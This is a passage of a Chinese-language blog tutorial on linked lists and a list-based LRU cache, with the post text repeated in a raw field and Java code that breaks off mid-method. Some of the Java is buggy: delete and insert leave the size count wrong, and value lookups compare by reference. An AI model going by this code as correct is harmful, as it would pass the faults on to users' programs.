双线链表\n\n接下来再看一个稍微复杂，在实际的软件开发中，也更加常见的链表结构：**双向链表**。\n\n单链表只有一个方向，节点只有一个后继指针，next指向后面的结点。而双向链表，顾名思义，它支持两个方向，每个结点不止有一个后继指针next指向后面的结点，还有一个前驱指针prev指向前面的结点。\n\n{% asset_img 双向链表.jpg %}\n\n从上图可以看出，双向链表需要额外的两个空间来存储后继结点和前驱结点的地址。所以，如果存储同样多的数据，双向链表要比单向链表占用更多的内存空间。虽然两个指针比较浪费存储空间，但可以支持双向遍历，这样也带来了双向链表的操作灵活性。那相比单向链表，双向链表适合解决哪种问题呢？\n\n从结构上来看，双向链表可以支持O(1)时间复杂度的情况下找到前驱结点，正是这样的特点，也使双向链表在某些情况下的删除、插入操作比单链表要简单、高效。\n\n你可能会说，单链表的插入、删除操作的时间复杂度都已经是O(1)了，双向链表还能怎么高效呢？别着急，刚刚的分析比较偏理论，很多数据结构和算法的书籍也是这么说得，但是这种说法实际上是不准确的，或者说是有先觉条件的。\n\n我们再来分析一下链表的两个操作，先来看删除操作。在实际的软件开发中，从链表中删除一个数据无外乎这两种情况：\n* 删除结点中“值等于某个给定值的”结点\n* 删除给定指针指向的结点\n\n对于第一种情况，不管是单链表还是双向链表，为了查找到值等于某个给定值的结点，都需要从头开始一个一个依次遍历对比，知道找到值等于给定值的结点，再通过前面讲的指针操作将其删除。\n\n尽管单纯的删除操作时间复杂度都是O(1)，但是遍历查找的时间是主要的耗时点，对应的时间复杂度为O(n)，根据时间复杂度分析中的加法法则，删除值等于给定值的结点对应的链表操作的总时间复杂度为O(n)。\n\n对于第二种情况，我们已经找到了要删除的结点，但是删除某个结点q需要知道前驱结点，而单链表并不支持直接获取前驱结点，所以为了找到前驱结点，我们还是要从头结点开始遍历链表，知道p->next = q，说明p是q的前驱结点。\n\n但是对于双向链表来说，这种情况就比较有优势了。因为双向链表中的结点已经保存了前驱结点的指针，不需要像单链表那样遍历。所以针对第二种情况，单链表删除操作需要O(n)的时间复杂度，而双向链表只需要在O(1)的时间复杂度内就搞定了！\n\n同理，如果我们希望在链表的某个指定结点前面插入一个结点，双向链表比单链表有很大优势，双向链表可以在O(1)时间复杂度搞定，而单向链表需要O(n)的时间复杂度。\n\n除了插入、删除操作有优势之外，对于一个有序链表，双向链表的按值查找的效率也要比单向链表高一些。因为我们可以记录上次查找的位置p，每次查询时，根据要查找的值与p的大小关系，决定是向前查找还是往后查找，所以平均只需要查找一半的数据。\n\n现在，有没有觉得双向链表比单向链表更加高效呢？这就是问什么在实际的软件开发中，双向链表尽管比较费内存，但还是比单链表的应用更加广泛的原因。如果你熟悉Java语言，你肯定用过LinkedHashMap这个容器，如果你深入研究LinkedHashMap的实现原理，就会发现其中就用到了双向链表这种数据结构。\n\n实际上，这里有一个更重要的知识点需要你掌握，那就是用空间换时间的设计思想。当内存空间充足时，如果我们更追求代码的执行速度，我们就可以选择空间复杂度相对较高，但时间复杂度相对较低的算法和数据结构。相反，如果内存比较紧缺，比如代码跑在手机或者单机片中，这个时候，就要反过来用时间换空间的涉及思路。\n\n还是开篇缓存的例子，缓存实际上就是利用了空间换时间的例子。虽然我们将数据存放在磁盘上，会比较节省内存，但是每次查询数据都要查询一遍磁盘，会比较慢。但是我们通过缓存技术，事先将数据加载在内存中，虽然会比较耗费内存空间，但是每次查询数据的速度就大大提高了。\n\n所以对于执行较慢的程序，可以通过消耗更多的内存(空间换时间)进行优化；而消耗过多内存的程序，可以通过消耗更多的时间(时间换空间)来降低内存的消耗。你还能想到其他时间换空间或者空间换时间的例子吗？\n\n了解了循环链表和双向链表，如果把这两种链表整合在一起就是一个新的版本：**双向循环链表**。我想不需要我多讲，你应该知道双向循环链表长什么样子了吧？\n\n{% asset_img 双向循环链表.jpg %}\n\n<div style=\"text-align: center;\">\n{% note success %} \n### 链表 VS 数组性能大比拼\n{% endnote %}\n</div>\n\n通过前面的学习，你应该知道，数组和链表是两种截然不同的内存组织方式，正是因为内存存储的区别，他们插入、删除、随机访问的时间复杂度正好相反。\n\n|时间复杂度|数组|链表|\n|--------|----|----|\n|插入删除|O(n)|O(1)|\n|随机访问|O(1)|O(n)|\n\n不过，数组和链表的对比，并不能局限于时间复杂度。而且，在实际的软件开发中，不能仅仅利用复杂度分析就能决定使用那哪个数据结构来存储数据。\n\n数组简单易用，在实现上使用的是连续的内存空间，可以借助CPU的缓存机制，预读数组中的数据，所以访问效率更高。而链表在内存中并不是连续存储，所以对CPU缓存并不好，没办法有效预读。\n\n数组的缺点是大小固定，一经声明就要占用整块连续内存空间。如果声明的数组过大，可能没有足够的连续内存空间分配给它，导致“内存不足”。如果声明的数组过小，则可能出现不够用的情况，这时只能再申请一个更大的内存空间，把原数组拷贝进去，非常费时。链表本身没有大小的限制，天然的支持动态扩容，我觉得这也是它与数组最大的区别。\n\n你可能会说，Java中也有ArrayList容器，也可以支持动态扩容啊？我们上一节已经讲过，当我们往支持动态扩容的数组中插入一个数据时，如果数组中没有空闲空间了，就会申请一个更大的空间，将原数组拷贝过去，而数据拷贝的操作是非常耗时的。\n\n我举一个稍微极端的例子。如果我们用ArrayList存储了1GB大小的数据，这个时候已经没有空闲空间了，当我们再插入数据的时候，ArrayList会申请一个1.5GB的存储空间，并且把原来那1GB的数据拷贝到新申请的空间上，听起来是不是就很耗时。\n\n除此之外，如果你的代码对内存的使用非常苛刻，那数组就更适合你。因为链表中的每个结点都需要消耗额外的内存空间去存储一份指向下一个结点的指针，所以内存消耗会翻倍。而且，对链表进行频繁的插入、删除操作，还会导致频繁的内存申请和释放，容易造成内存碎片，如果是java语言，就有可能会导致频繁的GC(Garbage Collection 垃圾回收)。\n\n所以在实际的开发项目中，要根据不同的项目情况，权衡究竟是选择数组还是链表。\n\n\n<div style=\"text-align: center;\">\n{% note success %} \n### 解答开篇\n{% endnote %}\n</div>\n\n好了，我们现在回过头来看，如何基于链表实现LRU缓存淘汰算法？\n\n我的思路是这样的：我们维护一个有序单链表，越靠近链表尾部的结点是越早之前访问的。当有一个新数据被访问时，我们从链表头部开始顺序遍历链表。\n\n1. 如果此数据之前已经被缓存在链表中了，我们遍历得到这个数据对应的结点，并将其从原来的位置删除，再插入到链表的头部。\n\n2. 如果此数据没有缓存在链表中，又可以分为两种情况：\n  - 如果此时缓存未满，则将此结点直接插入到链表的头部；\n  - 如果此时缓存已满，则链表尾结点删除，将新的数据结点插入链表的头部。\n\n这样我们就实现了一个LRU缓存，是不是很简单。\n\n现在我们来看下缓存访问的时间复杂度是多少。因为不管缓存有没有满，我们都需要遍历一遍链表，所以这种基于链表的实现思路，缓存访问的时间复杂度为O(n)。\n\n实际上，我们可以继续优化这个实现思路，比如引入哈希表(hash table)来记录每个数据的位置，将缓存访问的时间复杂度降到O(1)。这个优化方案，等讲到哈希表的时候再讲。\n\n基于链表的实现思路，实际上还可以用数组来实现LRU缓存淘汰策略。如何利用数组实现LRU缓存淘汰策略？\n\n<div style=\"text-align: center;\">\n{% note success %} \n### 内容小结\n{% endnote %}\n</div>\n\n今天我们讲了一种跟数组“相反”的数据结构，链表。他跟数组一样，也是非常基础、非常常用的数据结构。不过链表要比数组稍微复杂，从普通链表衍生出来好几种链表结构，比如双向链表、循环链表、双向循环链表。\n\n和数组相比，链表更适合插入、删除操作频繁的场景，查询的时间复杂度较高。不过在具体的软件开发中，要对数组和链表的各种性能进行对比，综合来使用两者中的一个。\n\n<div style=\"text-align: center;\">\n{% note success %} \n### 课后思考\n{% endnote %}\n</div>\n\n如何判断一个字符串是否是回文字符串呢？今天的思考题就是基于这个问题的改造版本。如果字符串是通过单链表来存储的，那如何来判断是一个回文串呢？相应的时间空间复杂度是多少。\n\n\n<script async src=\"//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js\"></script>\n<!-- 信息流广告 -->\n<ins class=\"adsbygoogle\"\n     style=\"display:block\"\n     data-ad-client=\"ca-pub-4127326375481893\"\n     data-ad-slot=\"9105526840\"\n     data-ad-format=\"auto\"\n     data-full-width-responsive=\"true\"></ins>\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>\n\n<br>\n\n本章代码：[GitHub](https://github.com/AriesRen/algorithm)\n\n带头单链表代码：\n\n```java\nimport java.util.NoSuchElementException;\n\npublic class SinglyLinkedList<T>{\n    private Node<T> head;\n    private int size;\n\n    public SinglyLinkedList(){\n        this.head = new Node<>(null);\n    }\n\n    // 链表头部插入值\n    private void linkFirst(Node<T> newNode){\n        newNode.next = head.next;\n        head.next = newNode;\n        size++;\n    }\n    // 链表尾部插入值\n    public void linkLast(T val){\n        Node<T> newNode = new Node<>(val);\n        linkLast(newNode);\n    }\n    private void linkLast(Node<T> newNode){\n        Node<T> p = head;\n        while (p.next!=null){\n            p=p.next;\n        }\n        p.next = newNode;\n        size++;\n    }\n    // 获取头部值\n    public T getFirst(){\n        if (head.next == null){\n            throw new NoSuchElementException();\n        }\n        return head.next.val;\n    }\n    // 获取尾部值\n    public T getLast(){\n        Node<T> p = head.next;\n        while (p.next!=null){\n            p = p.next;\n        }\n        return p.val;\n    }\n    // 添加\n    public void add(T val){\n        Node<T> newNode = new Node<>(val);\n        linkLast(newNode);\n    }\n    // 在某处索引插入\n    public void add(int index, T val){\n        Node<T> newNode = new Node<>(val);\n        Node<T> p = node(index);\n        insert(p, newNode);\n    }\n    private void insert(Node<T> p, Node<T> newNode){\n        Node<T> q = head;\n        while (q!=null && q.next!=p){\n            q = q.next;\n        }\n        if (q == null){\n            return;\n        }\n        newNode.next = p;\n        q.next = newNode;\n    }\n\n    // 根据值删除某个节点\n    public boolean delete(T val){\n        Node<T> p = head;\n        while (p.next !=null && !p.next.val.equals(val)){\n            p = p.next;\n        }\n        if (p.next== null){\n            return false;\n        }\n        p.next = p.next.next;\n        return true;\n    }\n    // 根据索引删除某结点\n    public T delete(int index){\n        Node<T> deleteNode = node(index);\n        return deleteNode(deleteNode);\n    }\n    private T deleteNode(Node<T> deleteNode){\n        final T element = deleteNode.val;\n        Node<T> p = head;\n        while (p.next!= null && p.next != deleteNode){\n            p = p.next;\n        }\n        if (p.next == null){\n            return null;\n        }\n        p.next = deleteNode.next;\n        return element;\n    }\n\n    // 根据索引获取值\n    public T get(int index){\n        if (index >= size || index < 0){\n            throw new IndexOutOfBoundsException(\"Index: \"+index + \", Size: \"+size);\n        }\n        return node(index).val;\n    }\n\n    // 通过value 查找对应的索引\n    public int indexOf(T val){\n        int index = 0;\n        Node<T> p = head;\n        while (p.next !=null && p.next.val!=val){\n            p = p.next;\n            index ++;\n        }\n        if (p.next == null){\n            index = -1;\n        }\n        return index;\n    }\n    public boolean contains(T val){\n        Node<T> p = head;\n        while (p.next !=null && p.next.val!=val){\n            p = p.next;\n        }\n        return p.next != null;\n    }\n\n    private Node<T> node(int index){\n        if (index >= size || index < 0){\n            throw new IndexOutOfBoundsException(\"Index: \"+index + \", Size: \"+size);\n        }\n        Node<T> p = head.next;\n        int i=0;\n        while (i<size){\n            if (i == index){ break; }\n            p = p.next;\n            ++i;\n        }\n        return p;\n    }\n    public void push(T val){\n        Node<T> newNode = new Node<>(val);\n        linkFirst(newNode);\n    }\n    public T pop(){\n        return unlinkedFirst();\n    }\n\n    private T unlinkedFirst(){\n        Node<T> first = head.next;\n        if (first == null){\n            throw new RuntimeException(\"没有元素\");\n        }\n        return unlinkedFirst(first);\n    }\n    private T unlinkedFirst(Node<T> node){\n        final T element = node.val;\n        head.next = head.next.next;\n        node.next = null;\n        node.val = null;\n        size--;\n        return element;\n    }\n\n    // 单链表反转\n    public void reverse(){\n        // 链表为空或者链表只有一个元素时\n        if (head.next == null || size <=1 ){\n            return;\n        }\n        Node<T> p = head.next;\n        Node<T> q = p.next;\n        Node<T> r;\n        p.next = null;\n        while (q !=null){\n            r = q.next;\n            q.next = p;\n            p = q;\n            q = r;\n        }\n        head.next = p;\n    }\n\n    public int size(){\n        return size;\n    }\n\n    // 打印链表 example: [1, 2, 3]\n    @Override\n    public String toString() {\n        if (head.next == null){\n            return \"[]\";\n        }\n        StringBuilder sb = new StringBuilder();\n        sb.append(\"[\");\n        Node<T> p = head.next;\n        while (p.next!=null){\n            sb.append(p.val).append(\", \");\n            p = p.next;\n        }\n        sb.append(p.val).append(\"]\");\n        return sb.toString();\n    }\n\n    public static class Node<T>{\n        private T val;\n        private Node<T> next;\n        Node(T val){\n            this.val = val;\n        }\n    }\n}\n```\n\n基于链表的LRU缓存代码：\n```java\npublic interface LRUCache<T> {\n    void put(T val);\n\n    T get(T val);\n\n    int Size();\n}\n\nclass ListLRUCache<T> implements LRUCache<T> {\n    private SinglyLinkedList<T> lruList;\n    private static final int DEFAULT_CAP=10;\n\n    // 缓存容量\n    private int cap;\n    // 缓存使用大小\n    private int size;\n\n    public ListLRUCache(){\n        this(DEFAULT_CAP);\n    }\n    public ListLRUCache(int cap){\n        this.cap = cap;\n        this.lruList = new SinglyLinkedList<>();\n    }\n\n    @Override\n    public void put(T value) {\n        // 1、缓存满了\n        // 如果该列表中没有该数据\n        if (size == cap){\n            // 1、缓存满了\n            // 删除最后一个节点\n            lruList.delete(size-1);\n            // 将该数据插入到链表头部\n            lruList.push(value);\n        }else {\n            // 2、缓存未满\n            // 直接在列表头部插入该数据\n            lruList.push(value);\n            size++;\n        }\n    }\n\n    @Override\n    public T get(T val) {\n        T result = null;\n        if (lruList.contains(val)){\n            // 在list中,从list中获取该数据\n            int index = lruList.indexOf(val);\n            result = lruList.get(index);\n            System.out.println(\"从缓存中获取\");\n            // 将该节点插入到链表头部\n            lruList.delete(index);\n            lruList.push(val);\n        }else{\n            // 如果该列表中没有该数据\n            System.out.println(\"缓存中没有该数据！\");\n            if (size == cap){\n                // 1、缓存满了\n                // 删除最后一个节点\n                lruList.delete(size-1);\n                // 将该数据插入到链表头部\n                lruList.push(val);\n                System.out.println(\"缓存已满！将该数据插入到缓存\");\n            }else {\n                // 2、缓存未满\n                // 直接在列表头部插入该数据\n                lruList.push(val);\n                size++;\n                System.out.println(\"将该数据直接插入到缓存\");\n            }\n            // 如果有数据库，该数据从数据库中获取\n            result = val;\n        }\n\n        return result;\n    }\n\n    public int Size(){\n        return size;\n    }\n}\n```\n\n字符串是否是回文字符串：\n```java\n\n```\n\n<br>","source":"_posts/算法-链表.md","raw":"---\ntitle: 算法-链表\ndate: 2018-09-12 00:18:36\ntags: ['算法','链表']\ncategories: 算法\nmathjax: true\n---\n\n<div style=\"text-align: center;\">\n{% note success %} \n### 前言\n{% endnote %}\n</div>\n\n今天我们来聊聊“链表 LinkedList”这个数据结构，学习链表有什么用呢，我们先来讨论一个经典的链表使用场景，那就是LRU缓存淘汰算法。\n\n缓存是一种提高数据读取性能的技术，在硬件设计、软件开发中都有着非常广泛的应用，比如常见的CPU缓存、数据库缓存、浏览器缓存等等。\n\n缓存的大小有限，当缓存被占满时，那些数据应该被清理出去，那些数据应该被保留？这就需要缓存淘汰策略来决定。常见的策略有这么三种：先进先出策略FIFO(First In First Out)、最少使用策略LFU(Least Frequently Used)、最近最少使用策略LRU(Least Recently Used)。\n\n今天我们的问题是，怎样用链表来实现一个LRU缓存淘汰策略？\n\n<div style=\"text-align: center;\">\n{% note success %} \n### 链表及其结构\n{% endnote %}\n</div>\n\n相比数组，链表是一种稍微复杂一点的数据结构，掌握起来也要比数组要困难一些。数组和链表是两个非常基础、非常常用的数据结构。所以要掌握甚至精通，同时理解其思想。\n\n我们先从**底层存储结构**来看一下二者的区别：\n\n为了直观的对比，我画了一张图，从图中可以看到，**数组需要一块连续的内存空间来存储**，对内存的要求比较高，如果我们申请一个100MB大小的内存空间，当内存中没有连续的、足够大的内存空间时，即便剩余的总空间大于100MB，仍然会申请失败。\n\n而链表恰恰相反，它并不需要一块连续的内存空间，他**通过“指针”将一组零散的内存块连接起来**使用，所以申请一块大小是100MB的链表，根本不会有问题。\n\n{% asset_img 数组与链表结构对比.jpg 数组与链表结构对比 %}\n\n链表的结构五花八门，今天我们着重介绍三种最常用的链表结构：单链表、双向链表、循环链表。\n\n#### 单链表\n\n首先来看最简单、最常用的单链表。我们刚讲到，链表是用指针将一组零散的内存块串联在一起，其中，我们把内存块称为链表的“**结点**”。为了使所有的节点串联起来，每个链表的结点出了需要保存数据之外，还需要记录链上下一个结点的地址，如图所示，我们把这个记录下一个结点指针地址的指针叫做**后继指针 next**。\n\n{% asset_img 单链表.jpg %}\n\n从上面单链表的结构图中，可以发现，单链表中有两个结点是比较特殊的，分别是第一个节点和最后一个结点，我们习惯性的把第一个结点称为**头结点**，最后一个节点称为**尾结点**。其中头结点用来记录链表的基地址，我们可以通过它遍历得到整个链表。而尾结点的特殊之处在于，指针不是指向下一个结点，二是指向了一个空地址null，表示这是链表的最后一个结点。\n\n与数组一样，链表也支持数据的插入、查找、删除操作。我们知道在进行数组的插入、删除操作时，为了保持内存的连续性，需要做大量的数据搬移操作，所以时间复杂度是O(n)。而在链表中插入或者删除一个数据，我们并不需要保持内存的连续性而搬移结点，因为链表本身的存储空间就不是连续的。所以在链表中插入删除一个数据是非常快的。\n\n为了方便理解，我画了一张图，从图中我们可以看出，针对链表的插入和删除操作，我们只需要考虑相邻结点的指针改变，所以对应的时间复杂度为O(1)。\n\n{% asset_img 单链表插入删除.jpg %}\n\n但是有利就有弊，链表想要随机访问第K个元素就没有数组那么高效了。因为链表中的数据并非是连续存储的，所以无法像数组那样，根据首地址和下标，通过寻址公式就可以直接计算出对应的内存地址，而是需要一个一个结点依次遍历，直到找到对应的结点。\n\n你可以把链表想象成一个队伍，每个人都知道自己前面的人是谁，所以当我们希望知道排在第K为的人是谁的时候，就需要从第一个人开始，一个一个往下数。所以链表随机访问的性能没有数组好，时间复杂度为O(n)。\n\n好了，单链表了解了，下面来看看另外两个复杂的链表：**循环链表和双向链表**。\n\n#### 循环链表\n\n**循环链表是一种特殊的单链表**。实际上，循环链表也很简单，它和单链表唯一的区别就在尾结点。我们知道，单链表的尾结点是指向空地址，表示这是最后的节点了，而循环链表的尾结点的指针是指向链表的头结点。从下图中可以看出，循环链表想一个环一样首尾相连，所以叫循环链表。\n\n{% asset_img 循环链表.jpg %}\n\n和单链表相比，循环链表的优点是从链尾到链头比较方便。当要处理的数据具有环形结构特点时，就特别适合采用循环链表，比如著名的约瑟夫问题。尽管用单链表也可以实现，但是用循环链表的话，代码就会简洁很多。\n\n#### 双线链表\n\n接下来再看一个稍微复杂，在实际的软件开发中，也更加常见的链表结构：**双向链表**。\n\n单链表只有一个方向，节点只有一个后继指针，next指向后面的结点。而双向链表，顾名思义，它支持两个方向，每个结点不止有一个后继指针next指向后面的结点，还有一个前驱指针prev指向前面的结点。\n\n{% asset_img 双向链表.jpg %}\n\n从上图可以看出，双向链表需要额外的两个空间来存储后继结点和前驱结点的地址。所以，如果存储同样多的数据，双向链表要比单向链表占用更多的内存空间。虽然两个指针比较浪费存储空间，但可以支持双向遍历，这样也带来了双向链表的操作灵活性。那相比单向链表，双向链表适合解决哪种问题呢？\n\n从结构上来看，双向链表可以支持O(1)时间复杂度的情况下找到前驱结点，正是这样的特点，也使双向链表在某些情况下的删除、插入操作比单链表要简单、高效。\n\n你可能会说，单链表的插入、删除操作的时间复杂度都已经是O(1)了，双向链表还能怎么高效呢？别着急，刚刚的分析比较偏理论，很多数据结构和算法的书籍也是这么说得，但是这种说法实际上是不准确的，或者说是有先觉条件的。\n\n我们再来分析一下链表的两个操作，先来看删除操作。在实际的软件开发中，从链表中删除一个数据无外乎这两种情况：\n* 删除结点中“值等于某个给定值的”结点\n* 删除给定指针指向的结点\n\n对于第一种情况，不管是单链表还是双向链表，为了查找到值等于某个给定值的结点，都需要从头开始一个一个依次遍历对比，知道找到值等于给定值的结点，再通过前面讲的指针操作将其删除。\n\n尽管单纯的删除操作时间复杂度都是O(1)，但是遍历查找的时间是主要的耗时点，对应的时间复杂度为O(n)，根据时间复杂度分析中的加法法则，删除值等于给定值的结点对应的链表操作的总时间复杂度为O(n)。\n\n对于第二种情况，我们已经找到了要删除的结点，但是删除某个结点q需要知道前驱结点，而单链表并不支持直接获取前驱结点，所以为了找到前驱结点，我们还是要从头结点开始遍历链表，知道p->next = q，说明p是q的前驱结点。\n\n但是对于双向链表来说，这种情况就比较有优势了。因为双向链表中的结点已经保存了前驱结点的指针，不需要像单链表那样遍历。所以针对第二种情况，单链表删除操作需要O(n)的时间复杂度，而双向链表只需要在O(1)的时间复杂度内就搞定了！\n\n同理，如果我们希望在链表的某个指定结点前面插入一个结点，双向链表比单链表有很大优势，双向链表可以在O(1)时间复杂度搞定，而单向链表需要O(n)的时间复杂度。\n\n除了插入、删除操作有优势之外，对于一个有序链表，双向链表的按值查找的效率也要比单向链表高一些。因为我们可以记录上次查找的位置p，每次查询时，根据要查找的值与p的大小关系，决定是向前查找还是往后查找，所以平均只需要查找一半的数据。\n\n现在，有没有觉得双向链表比单向链表更加高效呢？这就是问什么在实际的软件开发中，双向链表尽管比较费内存，但还是比单链表的应用更加广泛的原因。如果你熟悉Java语言，你肯定用过LinkedHashMap这个容器，如果你深入研究LinkedHashMap的实现原理，就会发现其中就用到了双向链表这种数据结构。\n\n实际上，这里有一个更重要的知识点需要你掌握，那就是用空间换时间的设计思想。当内存空间充足时，如果我们更追求代码的执行速度，我们就可以选择空间复杂度相对较高，但时间复杂度相对较低的算法和数据结构。相反，如果内存比较紧缺，比如代码跑在手机或者单机片中，这个时候，就要反过来用时间换空间的涉及思路。\n\n还是开篇缓存的例子，缓存实际上就是利用了空间换时间的例子。虽然我们将数据存放在磁盘上，会比较节省内存，但是每次查询数据都要查询一遍磁盘，会比较慢。但是我们通过缓存技术，事先将数据加载在内存中，虽然会比较耗费内存空间，但是每次查询数据的速度就大大提高了。\n\n所以对于执行较慢的程序，可以通过消耗更多的内存(空间换时间)进行优化；而消耗过多内存的程序，可以通过消耗更多的时间(时间换空间)来降低内存的消耗。你还能想到其他时间换空间或者空间换时间的例子吗？\n\n了解了循环链表和双向链表，如果把这两种链表整合在一起就是一个新的版本：**双向循环链表**。我想不需要我多讲，你应该知道双向循环链表长什么样子了吧？\n\n{% asset_img 双向循环链表.jpg %}\n\n<div style=\"text-align: center;\">\n{% note success %} \n### 链表 VS 数组性能大比拼\n{% endnote %}\n</div>\n\n通过前面的学习，你应该知道，数组和链表是两种截然不同的内存组织方式，正是因为内存存储的区别，他们插入、删除、随机访问的时间复杂度正好相反。\n\n|时间复杂度|数组|链表|\n|--------|----|----|\n|插入删除|O(n)|O(1)|\n|随机访问|O(1)|O(n)|\n\n不过，数组和链表的对比，并不能局限于时间复杂度。而且，在实际的软件开发中，不能仅仅利用复杂度分析就能决定使用那哪个数据结构来存储数据。\n\n数组简单易用，在实现上使用的是连续的内存空间，可以借助CPU的缓存机制，预读数组中的数据，所以访问效率更高。而链表在内存中并不是连续存储，所以对CPU缓存并不好，没办法有效预读。\n\n数组的缺点是大小固定，一经声明就要占用整块连续内存空间。如果声明的数组过大，可能没有足够的连续内存空间分配给它，导致“内存不足”。如果声明的数组过小，则可能出现不够用的情况，这时只能再申请一个更大的内存空间，把原数组拷贝进去，非常费时。链表本身没有大小的限制，天然的支持动态扩容，我觉得这也是它与数组最大的区别。\n\n你可能会说，Java中也有ArrayList容器，也可以支持动态扩容啊？我们上一节已经讲过，当我们往支持动态扩容的数组中插入一个数据时，如果数组中没有空闲空间了，就会申请一个更大的空间，将原数组拷贝过去，而数据拷贝的操作是非常耗时的。\n\n我举一个稍微极端的例子。如果我们用ArrayList存储了1GB大小的数据，这个时候已经没有空闲空间了，当我们再插入数据的时候，ArrayList会申请一个1.5GB的存储空间，并且把原来那1GB的数据拷贝到新申请的空间上，听起来是不是就很耗时。\n\n除此之外，如果你的代码对内存的使用非常苛刻，那数组就更适合你。因为链表中的每个结点都需要消耗额外的内存空间去存储一份指向下一个结点的指针，所以内存消耗会翻倍。而且，对链表进行频繁的插入、删除操作，还会导致频繁的内存申请和释放，容易造成内存碎片，如果是java语言，就有可能会导致频繁的GC(Garbage Collection 垃圾回收)。\n\n所以在实际的开发项目中，要根据不同的项目情况，权衡究竟是选择数组还是链表。\n\n\n<div style=\"text-align: center;\">\n{% note success %} \n### 解答开篇\n{% endnote %}\n</div>\n\n好了，我们现在回过头来看，如何基于链表实现LRU缓存淘汰算法？\n\n我的思路是这样的：我们维护一个有序单链表，越靠近链表尾部的结点是越早之前访问的。当有一个新数据被访问时，我们从链表头部开始顺序遍历链表。\n\n1. 如果此数据之前已经被缓存在链表中了，我们遍历得到这个数据对应的结点，并将其从原来的位置删除，再插入到链表的头部。\n\n2. 如果此数据没有缓存在链表中，又可以分为两种情况：\n  - 如果此时缓存未满，则将此结点直接插入到链表的头部；\n  - 如果此时缓存已满，则链表尾结点删除，将新的数据结点插入链表的头部。\n\n这样我们就实现了一个LRU缓存，是不是很简单。\n\n现在我们来看下缓存访问的时间复杂度是多少。因为不管缓存有没有满，我们都需要遍历一遍链表，所以这种基于链表的实现思路，缓存访问的时间复杂度为O(n)。\n\n实际上，我们可以继续优化这个实现思路，比如引入哈希表(hash table)来记录每个数据的位置，将缓存访问的时间复杂度降到O(1)。这个优化方案，等讲到哈希表的时候再讲。\n\n基于链表的实现思路，实际上还可以用数组来实现LRU缓存淘汰策略。如何利用数组实现LRU缓存淘汰策略？\n\n<div style=\"text-align: center;\">\n{% note success %} \n### 内容小结\n{% endnote %}\n</div>\n\n今天我们讲了一种跟数组“相反”的数据结构，链表。他跟数组一样，也是非常基础、非常常用的数据结构。不过链表要比数组稍微复杂，从普通链表衍生出来好几种链表结构，比如双向链表、循环链表、双向循环链表。\n\n和数组相比，链表更适合插入、删除操作频繁的场景，查询的时间复杂度较高。不过在具体的软件开发中，要对数组和链表的各种性能进行对比，综合来使用两者中的一个。\n\n<div style=\"text-align: center;\">\n{% note success %} \n### 课后思考\n{% endnote %}\n</div>\n\n如何判断一个字符串是否是回文字符串呢？今天的思考题就是基于这个问题的改造版本。如果字符串是通过单链表来存储的，那如何来判断是一个回文串呢？相应的时间空间复杂度是多少。\n\n\n<script async src=\"//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js\"></script>\n<!-- 信息流广告 -->\n<ins class=\"adsbygoogle\"\n     style=\"display:block\"\n     data-ad-client=\"ca-pub-4127326375481893\"\n     data-ad-slot=\"9105526840\"\n     data-ad-format=\"auto\"\n     data-full-width-responsive=\"true\"></ins>\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>\n\n<br>\n\n本章代码：[GitHub](https://github.com/AriesRen/algorithm)\n\n带头单链表代码：\n\n```java\nimport java.util.NoSuchElementException;\n\npublic class SinglyLinkedList<T>{\n    private Node<T> head;\n    private int size;\n\n    public SinglyLinkedList(){\n        this.head = new Node<>(null);\n    }\n\n    // 链表头部插入值\n    private void linkFirst(Node<T> newNode){\n        newNode.next = head.next;\n        head.next = newNode;\n        size++;\n    }\n    // 链表尾部插入值\n    public void linkLast(T val){\n        Node<T> newNode = new Node<>(val);\n        linkLast(newNode);\n    }\n    private void linkLast(Node<T> newNode){\n        Node<T> p = head;\n        while (p.next!=null){\n            p=p.next;\n        }\n        p.next = newNode;\n        size++;\n    }\n    // 获取头部值\n    public T getFirst(){\n        if (head.next == null){\n            throw new NoSuchElementException();\n        }\n        return head.next.val;\n    }\n    // 获取尾部值\n    public T getLast(){\n        Node<T> p = head.next;\n        while (p.next!=null){\n            p = p.next;\n        }\n        return p.val;\n    }\n    // 添加\n    public void add(T val){\n        Node<T> newNode = new Node<>(val);\n        linkLast(newNode);\n    }\n    // 在某处索引插入\n    public void add(int index, T val){\n        Node<T> newNode = new Node<>(val);\n        Node<T> p = node(index);\n        insert(p, newNode);\n    }\n    private void insert(Node<T> p, Node<T> newNode){\n        Node<T> q = head;\n        while (q!=null && q.next!=p){\n            q = q.next;\n        }\n        if (q == null){\n            return;\n        }\n        newNode.next = p;\n        q.next = newNode;\n    }\n\n    // 根据值删除某个节点\n    public boolean delete(T val){\n        Node<T> p = head;\n        while (p.next !=null && !p.next.val.equals(val)){\n            p = p.next;\n        }\n        if (p.next== null){\n            return false;\n        }\n        p.next = p.next.next;\n        return true;\n    }\n    // 根据索引删除某结点\n    public T delete(int index){\n        Node<T> deleteNode = node(index);\n        return deleteNode(deleteNode);\n    }\n    private T deleteNode(Node<T> deleteNode){\n        final T element = deleteNode.val;\n        Node<T> p = head;\n        while (p.next!= null && p.next != deleteNode){\n            p = p.next;\n        }\n        if (p.next == null){\n            return null;\n        }\n        p.next = deleteNode.next;\n        return element;\n    }\n\n    // 根据索引获取值\n    public T get(int index){\n        if (index >= size || index < 0){\n            throw new IndexOutOfBoundsException(\"Index: \"+index + \", Size: \"+size);\n        }\n        return node(index).val;\n    }\n\n    // 通过value 查找对应的索引\n    public int indexOf(T val){\n        int index = 0;\n        Node<T> p = head;\n        while (p.next !=null && p.next.val!=val){\n            p = p.next;\n            index ++;\n        }\n        if (p.next == null){\n            index = -1;\n        }\n        return index;\n    }\n    public boolean contains(T val){\n        Node<T> p = head;\n        while (p.next !=null && p.next.val!=val){\n            p = p.next;\n        }\n        return p.next != null;\n    }\n\n    private Node<T> node(int index){\n        if (index >= size || index < 0){\n            throw new IndexOutOfBoundsException(\"Index: \"+index + \", Size: \"+size);\n        }\n        Node<T> p = head.next;\n        int i=0;\n        while (i<size){\n            if (i == index){ break; }\n            p = p.next;\n            ++i;\n        }\n        return p;\n    }\n    public void push(T val){\n        Node<T> newNode = new Node<>(val);\n        linkFirst(newNode);\n    }\n    public T pop(){\n        return unlinkedFirst();\n    }\n\n    private T unlinkedFirst(){\n        Node<T> first = head.next;\n        if (first == null){\n            throw new RuntimeException(\"没有元素\");\n        }\n        return unlinkedFirst(first);\n    }\n    private T unlinkedFirst(Node<T> 